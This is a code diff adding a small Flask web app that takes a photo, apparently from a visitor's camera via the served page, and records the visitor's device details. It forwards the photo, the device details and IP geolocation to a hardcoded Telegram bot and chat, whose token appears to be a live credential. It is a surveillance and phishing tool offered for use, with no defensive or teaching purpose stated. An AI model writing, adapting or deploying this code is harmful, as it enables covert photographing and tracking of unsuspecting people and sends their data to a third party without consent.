@@ -1,0 +1,42 @@
+from flask import Flask, request, render_template, jsonify
+import requests
+import telebot
+import base64
+
+TOKEN = "7756384152:AAEpXocV1AfjgXBOpRE4vi-Q7WTTJWI6aW4"  # Replace with your Telegram bot token
+CHAT_ID = "1227177654"  # Replace with your Telegram Chat ID
+
+bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return render_template("index.html")  # Load the webpage
+
+@app.route("/capture", methods=["POST"])
+def capture():
+    data = request.json
+    ip_data = requests.get("https://ipinfo.io/json").json()  # Get IP info
+    photo_data = data.get("photo")  # Get base64 photo
+    user_agent = request.headers.get('User-Agent')  # Get device details
+
+    # Save the image
+    with open("user_photo.jpg", "wb") as f:
+        f.write(base64.b64decode(photo_data.split(",")[1]))
+
+    # Send IP, location, and device info to Telegram
+    message = f"🌐 **User Info Captured!**\n\n"
+    message += f"🆔 IP: {ip_data['ip']}\n"
+    message += f"📍 Location: {ip_data['city']}, {ip_data['region']}, {ip_data['country']}\n"
+    message += f"📱 Device: {user_agent}\n"
+    
+    bot.send_message(CHAT_ID, message)
+
+    # Send the captured photo
+    with open("user_photo.jpg", "rb") as photo:
+        bot.send_photo(CHAT_ID, photo)
+
+    return jsonify({"message": "Data sent to Telegram"})
+
+if __name__ == "__main__":
+    app.run(debug=True)
